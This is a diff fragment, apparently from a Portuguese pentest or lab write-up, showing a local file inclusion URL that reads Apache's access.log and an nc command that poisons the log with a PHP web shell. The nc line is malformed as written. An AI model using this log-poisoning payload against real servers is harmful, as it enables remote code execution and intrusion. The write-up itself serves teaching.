@@ -16,6 +16,7 @@ Podemos carregar o access.log do servidor, normalmente em:
 ``rh.businesscorp.com.br/index.php?page=/../../var/log/apache2/access.log%00``
 
 Com isso iremos infectar o access.log com um código malicioso:
+
 ```bash
 nc -v rh.businesscorp.com.br 80 < "<?php system($_GET['cmd']); ?>"
 ```
